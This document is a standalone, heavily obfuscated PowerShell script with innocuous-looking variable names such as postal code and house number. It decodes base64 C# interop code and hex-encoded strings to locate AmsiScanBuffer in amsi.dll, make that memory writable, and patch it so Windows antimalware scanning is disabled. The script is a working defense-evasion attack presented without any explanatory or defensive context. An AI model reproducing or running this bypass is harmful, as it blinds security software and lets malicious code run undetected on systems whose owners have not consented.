$repo = "dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AO"
$repo += "wAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQB"
$repo += "tAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0A"
$repo += "GUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzADsA"
$repo += "CgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAg"
$l = '2E', '41', '42', '53', '61', '63', '64', '65', '66', '69', '6C', '6D', '6E', '72', '73', '75';
$l2 = '6F', '4D', '73', '2E', '69', '63', '76', '65', '6E', '68', '75', '6C', '79', '61', '74', '49', '52', '6D', '53', '70', '72'
$postalCode = 0xB8
$cityId = 0x57
$countryCode = 0x00
$regionId = 0x07
$geoId = 0x80
$houseNo = 0xC3
$repo += "AE4AYQBtAGUAUgBlAHAAbwBzAGkAdABvAHIAe"
$repo += "QAgAHsACgAgACAAIAAgAFsARABsAGwASQBtAHA"
$repo += "AbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiAC"
$repo += "kAXQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAH"
$repo += "QAYQB0AGkAYwAgAGUAeAB0AGUAcgB"
$repo += "uACAASQBuAHQAUAB0AHIAIABHAGUAdABQAH"
$repo += "IAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQ"
$repo += "AHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwAKACAAIAAg"
$repo += "ACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAAoAIAAgACAAIABwAHUAYgBs"
$repo += "AGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAH"
$repo += "IAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZ"
$repo2 = "QByAG4AZQBsADMAMgAiACkAXQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgB"
$repo2 += "uACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABk"
$repo2 += "AHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQA"
$repo2 += "HIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AAoAfQA="
Add-Type $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($repo+$repo2)))
$MyHomeAddress = [NameRepository]::LoadLibrary($($($l[4] + " " + $l[11] + " " + $l[14]+ " " + $l[9] + " " + $l[0]+ " " + $l[6]+ " " + $l[10]+ " " + $l[10]).Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result1x=$result1x+$_};$result1x))
$CustomerAddress = [NameRepository]::GetProcAddress($MyHomeAddress, $($($l[1]+ " " +$l[11]+ " " +$l[14]+ " " +$l[9]+ " " +$l[3]+ " " +$l[5]+ " " +$l[4]+ " " +$l[12]+ " " +$l[2]+ " " +$l[15]+ " " +$l[8]+ " " +$l[8]+ " " +$l[7]+ " " +$l[13]).Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2x=$result2x+$_};$result2x))
$p = 0
[NameRepository]::VirtualProtect($CustomerAddress, [uint32]5, 0x40, [ref]$p)
$LastName = [Byte[]] ($postalCode, $cityId, $countryCode, $regionId, $geoId, $houseNo)
$xtype = [Ref].Assembly.GetType($($($($l2[18]+ " " +$l2[12]+ " " +$l2[2]+ " " +$l2[14]+ " " +$l2[7]+ " " +$l2[17]+ " " +$l2[3]+ " " +$l2[16]+ " " +$l2[10]+ " " +$l2[8]+ " " +$l2[14]+ " " +$l2[4]+ " " +$l2[17]+ " " +$l2[7]+ " " +$l2[3]+ " " +$l2[15]+ " " +$l2[8]+ " " +$l2[14]+ " " +$l2[7]+ " " +$l2[20]+ " " +$l2[0]+ " " +$l2[19]+ " " +$l2[18]+ " " +$l2[7]+ " " +$l2[20]+ " " +$l2[6]+ " " +$l2[4]+ " " +$l2[5]+ " " +$l2[7]+ " " +$l2[2]+ " " +$l2[3]+ " " +$l2[1]+ " " +$l2[13]+ " " +$l2[20]+ " " +$l2[2]+ " " +$l2[9]+ " " +$l2[13]+ " " +$l2[11]).Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result3x=$result3x+$_};$result3x)))
[System.Runtime.InteropServices.Marshal]::Copy($LastName, 0, $CustomerAddress, 6)
